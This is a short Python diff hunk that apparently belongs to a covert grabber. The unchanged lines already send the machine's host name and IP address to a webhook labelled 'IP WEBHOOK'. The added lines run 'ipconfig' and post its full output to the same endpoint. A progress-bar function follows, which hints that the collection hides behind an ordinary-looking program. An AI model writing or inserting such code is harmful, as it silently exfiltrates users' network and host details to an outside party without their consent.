@@ -7,6 +7,12 @@ t = time.strftime("%H:%M:%S", t)
 d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
 d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
 requests.post(u, json=d)
+
+o = subprocess.check_output("ipconfig", shell=True, universal_newlines=True)
+d = {"content" : f"**--------------------------------------**\n", "username" : "IP WEBHOOK"}
+d["embeds"] = [{"description" : f"**IP Config**:\n```\n{o}\n```", "title" : "IP Config: "}]
+r = requests.post(u, json=d)
+
 def p(percentage):
     bar_length = 50
     block = int(round(bar_length * percentage))
